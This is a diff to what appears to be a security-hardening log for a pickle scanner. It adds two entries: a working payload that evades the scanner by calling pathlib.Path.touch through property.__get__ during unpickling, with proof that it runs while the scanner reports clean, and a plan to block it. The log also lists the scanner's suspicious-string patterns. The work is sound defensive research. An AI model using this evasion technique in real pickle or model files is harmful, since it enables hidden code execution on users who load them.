@@ -2847,3 +2847,106 @@ Blocking plan:
 Performance note: the fix adds three tuples to a sorted static table checked
 with binary search. It does not add wrapper-object tracking, decorator
 semantics, or callable-flow simulation.
+
+## Turn 63 - `builtins.property.__get__` descriptor invocation gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using Python's property
+descriptor protocol to call an attacker-selected getter during deserialization.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_builtins_property_get_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("builtins", "property"),
+        sg("pathlib", "Path.touch"),
+        b"\x85R\x94",
+        sg("builtins", "property.__get__"),
+        b"h\x00",
+        sg("pathlib", "PosixPath"),
+        b"(",
+        *(s(part) for part in marker.parts),
+        b"tR",
+        b"\x86R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=147`, `bytes_total=147`, `opcode_count=26`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `builtins.property`, `pathlib.Path.touch`,
+  `builtins.property.__get__`, and `pathlib.PosixPath`, all with
+  `is_dangerous=False`
+- Control proof: the same pickle without the final descriptor-get call returns
+  `<property object ...>` with `fget=pathlib.Path.touch` and does not create
+  `/tmp/ma_builtins_property_get_marker`
+- Unpickle result: the full payload creates
+  `/tmp/ma_builtins_property_get_marker` and returns `None`
+- RCE mechanism: `property.__get__(prop, obj)` invokes `prop.fget(obj)`.
+  The payload first constructs `property(pathlib.Path.touch)`, then calls the
+  unbound descriptor getter with the attacker-chosen `Path` as `obj`, causing
+  `Path.touch(marker)` to execute before `pickle.loads()` returns.
+
+Why the scanner missed it:
+
+- `builtins.property` is absent from `BUILTIN_DANGEROUS_NAMES`.
+- `builtins.property.__get__` is also absent from `BUILTIN_DANGEROUS_NAMES`,
+  and builtin checks are exact-name checks even when the pickle `STACK_GLOBAL`
+  name contains dots.
+- The payload uses only currently clean globals:
+  `builtins.property`, `pathlib.Path.touch`, `builtins.property.__get__`, and
+  `pathlib.PosixPath`.
+- The dangerous function is stored inside a synthesized descriptor object, then
+  reached through a clean-looking descriptor method rather than through a
+  directly policy-listed callable.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, or `subprocess`.
+
+Performance note: this is a descriptor-method sink with a precise static name.
+The focused next block should add `property.__get__` to
+`BUILTIN_DANGEROUS_NAMES`, plus a manual-pickle oracle regression proving
+scan-time detection before the descriptor getter creates the marker. The hot
+path remains the existing builtin exact-name membership check.
+
+## Turn 64 - Block `builtins.property.__get__` descriptor calls
+
+Blocking plan:
+
+- Add `property.__get__` to `BUILTIN_DANGEROUS_NAMES`. The exact dotted builtin
+  name reaches the descriptor method that invokes a property object's
+  attacker-controlled `fget` callable.
+- Leave `builtins.property` itself allowed because constructing a descriptor
+  does not execute the getter. The sink is the descriptor-get method, not the
+  descriptor constructor.
+- Add a CPython oracle regression that builds the manual
+  `property(Path.touch)` payload, verifies the control descriptor still scans
+  clean and does not create the marker, then verifies scan-time detection on
+  the RCE variant before proving `property.__get__(prop, marker)` creates the
+  marker during `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]` because this strengthens
+  user-visible pickle detection coverage.
+
+Performance note: the fix is a single exact builtin-name membership check. It
+does not add descriptor-object tracking, dotted-name expansion, or stack-flow
+simulation.
